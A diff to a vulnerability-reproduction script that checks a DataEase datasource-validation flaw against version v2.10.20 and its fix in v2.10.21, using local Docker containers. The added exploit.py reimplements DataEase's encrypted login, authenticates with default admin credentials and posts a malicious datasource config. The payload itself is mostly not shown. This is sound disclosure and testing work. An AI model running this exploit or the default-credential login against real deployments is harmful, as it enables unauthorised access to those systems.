@@ -1,0 +1,250 @@
+--- repro/reproduction_steps.sh
++++ repro/reproduction_steps.sh
+@@ -7,9 +7,23 @@
+
+ cd "$ROOT"
+
++export DOCKER_API_VERSION="${DOCKER_API_VERSION:-1.43}"
++
+ VULN_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.20"
+ FIX_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.21"
+ MYSQL_IMAGE="registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.5"
++RUN_ROOT="${PRUVA_REPRO_CACHE_DIR:-$ROOT/.pruva-repro-cache}/REPRO-2026-00165"
++mkdir -p "$RUN_ROOT"
++
++if ! python3 - <<'PY' >/dev/null 2>&1
++import requests
++import rsa
++from Crypto.Cipher import AES
++PY
++then
++    echo "[*] Installing Python login dependencies..."
++    python3 -m pip install --break-system-packages -q requests pycryptodome rsa
++fi
+
+ # Cleanup function
+ cleanup() {
+@@ -48,10 +62,48 @@
+ # Write the exploit Python script
+ EXPLOIT_PY="$LOGS/exploit.py"
+ cat > "$EXPLOIT_PY" <<'PY'
+-import base64, json, urllib.request, sys
++import base64, json, sys, time
++
++import requests
++import rsa
++from Crypto.Cipher import AES
++from Crypto.Util.Padding import unpad
+
+ port = sys.argv[1]
+-url = f"http://127.0.0.1:{port}/de2api/datasource/validate"
++base = f"http://127.0.0.1:{port}"
++url = f"{base}/de2api/datasource/validate"
++
++def get_token():
++    last = None
++    for _ in range(60):
++        last = requests.get(f"{base}/de2api/dekey", timeout=10).json()
++        dekey = last.get("data")
++        if isinstance(dekey, str) and dekey:
++            break
++        time.sleep(3)
++    else:
++        raise RuntimeError(f"dekey unavailable: {last}")
++    sep = base64.b64encode(b"-pk_separator-").decode()
++    parts = dekey.split(sep + "=")
++    if len(parts) != 2:
++        parts = dekey.split(sep)
++    k1, k2 = parts[0], parts[1]
++    cipher = AES.new(k2.encode("utf-8"), AES.MODE_CBC, b"0000000000000000")
++    pk = unpad(cipher.decrypt(base64.b64decode(k1)), AES.block_size).decode()
++    pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(
++        ("-----BEGIN PUBLIC KEY-----\n" + pk + "\n-----END PUBLIC KEY-----").encode()
++    )
++    name = base64.b64encode(rsa.encrypt(b"admin", pubkey)).decode()
++    pwd = base64.b64encode(rsa.encrypt(b"DataEase@123456", pubkey)).decode()
++    resp = requests.post(
++        f"{base}/de2api/login/localLogin",
++        json={"name": name, "pwd": pwd, "origin": 0},
++        timeout=10,
++    )
++    data = resp.json()
++    if data.get("code") != 0 or not data.get("data"):
++        raise RuntimeError(resp.text)
++    return data["data"]["token"]
+
+ malicious_config = {
+     "type": "mysql",
+@@ -70,27 +122,44 @@
+     "configuration": base64.b64encode(json.dumps(malicious_config).encode()).decode()
+ }
+
+-req = urllib.request.Request(
+-    url,
+-    data=json.dumps(payload).encode(),
+-    headers={"Content-Type": "application/json"},
+-    method="POST"
+-)
+-
+ try:
+-    with urllib.request.urlopen(req, timeout=15) as resp:
+-        body = resp.read().decode()
+-        print(body)
+-        sys.exit(0)
+-except urllib.error.HTTPError as e:
+-    body = e.read().decode()
+-    print(body)
++    token = get_token()
++    resp = requests.post(
++        url,
++        json=payload,
++        headers={"Content-Type": "application/json", "X-DE-TOKEN": token},
++        timeout=15,
++    )
++    print(resp.text)
+     sys.exit(0)
+ except Exception as e:
+     print(json.dumps({"error": str(e)}))
+     sys.exit(1)
+ PY
+
++cleanup_dir() {
++    local target=$1
++
++    [ -e "$target" ] || return 0
++    rm -rf "$target" 2>/dev/null && return 0
++
++    if command -v sudo >/dev/null 2>&1; then
++        sudo -n rm -rf "$target" 2>/dev/null && return 0
++    fi
++
++    if docker image inspect "$MYSQL_IMAGE" >/dev/null 2>&1; then
++        docker run --rm \
++            -v "$target:/cleanup" \
++            --entrypoint sh \
++            "$MYSQL_IMAGE" \
++            -c 'chmod -R a+rwX /cleanup' >/dev/null 2>&1 || true
++        rm -rf "$target" 2>/dev/null && return 0
++    fi
++
++    rm -rf "$target"
++}
++
++
+ # Function to start MySQL + DataEase pair with docker compose
+ start_pair() {
+     local de_image=$1
+@@ -100,11 +169,12 @@
+     local de_port=$5
+     local base_dir=$6
+
+-    rm -rf "$base_dir"
++    cleanup_dir "$base_dir"
+     mkdir -p "$base_dir/bin/mysql" "$base_dir/data/mysql" "$base_dir/logs" \
+              "$base_dir/data/static-resource" "$base_dir/data/geo" \
+              "$base_dir/data/appearance" "$base_dir/data/exportData" \
+              "$base_dir/data/plugin" "$base_dir/data/font" "$base_dir/data/i18n"
++    chmod -R a+rwX "$base_dir"
+
+     # MySQL init script
+     cat > "$base_dir/bin/mysql/init.sql" <<'EOF'
+@@ -160,10 +230,16 @@
+       retries: 20
+     environment:
+       MYSQL_ROOT_PASSWORD: Password123@mysql
+-    volumes:
+-      - ${base_dir}/my.cnf:/etc/mysql/conf.d/my.cnf
+-      - ${base_dir}/bin/mysql:/docker-entrypoint-initdb.d/
+-      - ${base_dir}/data/mysql:/var/lib/mysql
++      MYSQL_DATABASE: dataease
++    command:
++      - --default-storage-engine=INNODB
++      - --character-set-server=utf8mb4
++      - --collation-server=utf8mb4_0900_ai_ci
++      - --max_connections=2000
++      - --innodb-flush-log-at-trx-commit=0
++      - --sync-binlog=0
++      - --sql-mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION
++      - --skip-name-resolve
+     networks:
+       - ${network_name}
+
+@@ -179,16 +255,15 @@
+       - ${network_name}
+     environment:
+       - SPRING_PROFILES_ACTIVE=standalone
+-    volumes:
+-      - ${base_dir}/application.yml:/opt/dataease2.0/conf/application.yml
+-      - ${base_dir}/logs:/opt/dataease2.0/logs
+-      - ${base_dir}/data/static-resource:/opt/dataease2.0/data/static-resource
+-      - ${base_dir}/data/geo:/opt/dataease2.0/data/geo
+-      - ${base_dir}/data/appearance:/opt/dataease2.0/data/appearance
+-      - ${base_dir}/data/exportData:/opt/dataease2.0/data/exportData
+-      - ${base_dir}/data/plugin:/opt/dataease2.0/data/plugin
+-      - ${base_dir}/data/font:/opt/dataease2.0/data/font
+-      - ${base_dir}/data/i18n:/opt/dataease2.0/data/i18n
++      - SPRING_DATASOURCE_URL=jdbc:mysql://${mysql_name}:3306/dataease?autoReconnect=false&useUnicode=true&characterEncoding=UTF-8&characterSetResults=UTF-8&zeroDateTimeBehavior=convertToNull&useSSL=false&allowPublicKeyRetrieval=true
++      - SPRING_DATASOURCE_USERNAME=root
++      - SPRING_DATASOURCE_PASSWORD=Password123@mysql
++      - DE_MYSQL_HOST=${mysql_name}
++      - DE_MYSQL_PORT=3306
++      - DE_MYSQL_DB=dataease
++      - DE_MYSQL_USER=root
++      - DE_MYSQL_PASSWORD=Password123@mysql
++      - DE_INSTALL_MODE=community
+
+ networks:
+   ${network_name}:
+@@ -206,7 +281,7 @@
+     local port=$2
+     echo "[*] Waiting for DataEase API ($name) on port $port..."
+     for i in $(seq 1 180); do
+-        if curl -sf "http://127.0.0.1:${port}/de2api/datasource/types" >/dev/null 2>&1; then
++        if curl --max-time 5 -sf "http://127.0.0.1:${port}/de2api/dekey" | grep -Eq '"data"[[:space:]]*:[[:space:]]*"'; then
+             echo "[*] DataEase $name is responding on port $port"
+             return 0
+         fi
+@@ -219,6 +294,7 @@
+     done
+     echo "[ERROR] DataEase $name did not become ready in time"
+     docker logs "$name" > "$LOGS/${name}_startup.log" 2>&1 || true
++    docker logs "${name/dataease/mysql}" > "$LOGS/${name}_mysql_startup.log" 2>&1 || true
+     return 1
+ }
+
+@@ -228,7 +304,7 @@
+ echo "[1] Testing VULNERABLE version (v2.10.20)"
+ echo "=========================================="
+
+-start_pair "$VULN_IMAGE" dataease-vuln mysql-vuln de-net-vuln "$VULN_PORT" /tmp/dataease-repro-vuln
++start_pair "$VULN_IMAGE" dataease-vuln mysql-vuln de-net-vuln "$VULN_PORT" "$RUN_ROOT/dataease-repro-vuln"
+ wait_for_dataease dataease-vuln "$VULN_PORT"
+
+ echo "[*] Sending malicious datasource validate request to vulnerable version..."
+@@ -245,7 +321,7 @@
+     VULN_RESULT=1
+ fi
+
+-cd /tmp/dataease-repro-vuln && docker compose -f compose.yml down >/dev/null 2>&1; cd "$ROOT"
++cd "$RUN_ROOT/dataease-repro-vuln" && docker compose -f compose.yml down -v >/dev/null 2>&1; cd "$ROOT"
+ sleep 5
+
+ # --- Test FIXED version ---
+@@ -254,7 +330,7 @@
+ echo "[2] Testing FIXED version (v2.10.21)"
+ echo "=========================================="
+
+-start_pair "$FIX_IMAGE" dataease-fix mysql-fix de-net-fix "$FIX_PORT" /tmp/dataease-repro-fix
++start_pair "$FIX_IMAGE" dataease-fix mysql-fix de-net-fix "$FIX_PORT" "$RUN_ROOT/dataease-repro-fix"
+ wait_for_dataease dataease-fix "$FIX_PORT"
+
+ echo "[*] Sending malicious datasource validate request to fixed version..."
+@@ -271,7 +347,7 @@
+     FIX_RESULT=1
+ fi
+
+-cd /tmp/dataease-repro-fix && docker compose -f compose.yml down >/dev/null 2>&1; cd "$ROOT"
++cd "$RUN_ROOT/dataease-repro-fix" && docker compose -f compose.yml down -v >/dev/null 2>&1; cd "$ROOT"
+
+ # Write runtime manifest
+ cat > "$ROOT/repro/runtime_manifest.json" <<EOF
